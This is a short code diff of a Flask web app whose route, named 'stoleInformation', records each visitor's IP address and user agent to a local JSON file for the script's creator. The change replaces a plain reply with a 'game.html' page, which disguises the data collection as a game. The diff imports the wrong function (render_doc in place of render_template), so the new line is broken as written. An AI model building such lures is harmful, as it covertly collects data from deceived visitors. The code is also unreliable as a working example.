@@ -1,3 +1,4 @@
+from pydoc import render_doc
 from flask import Flask, request
 import json
 import threading
@@ -21,7 +22,7 @@ def stoleInformation():
     user_agent = request.user_agent.string
     info['Machines'].append(DataUser(ip_addr, user_agent).__dict__)
     write(info, 'infoMachines.json')
-    return 'We are here'
+    return render_template("game.html")
 
 # Write information about clients to a local disk (accessible to the script creator)
 def write(data, filename):
